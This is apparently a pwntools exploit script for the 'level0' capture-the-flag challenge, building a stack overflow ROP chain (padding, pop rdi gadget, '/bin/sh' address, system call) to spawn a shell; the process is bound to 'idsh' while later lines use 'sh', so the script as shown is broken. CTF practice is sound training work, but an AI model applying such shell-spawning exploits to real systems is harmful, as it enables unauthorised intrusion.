from pwn import *

context.log_level = 'debug' #可在屏幕上打印debug信息
idsh = process("./level0")
#sh = gdb.debug("./level0")
# sh = remote("node4.buuoj.cn", 25087)
elf = ELF("./level0")
system_plt = elf.plt['system']
binsh = 0x400684
pop_rdi_ret = 0x400663
sh.recv()
print(system_plt)
payload = flat(cyclic(0x88), p64(pop_rdi_ret), p64(binsh), p64(0x4005C5) + p64(system_plt))
# payload = flat(b'a' * 0x88, p64(0x40059A))
sh.sendline(payload)
sh.interactive()
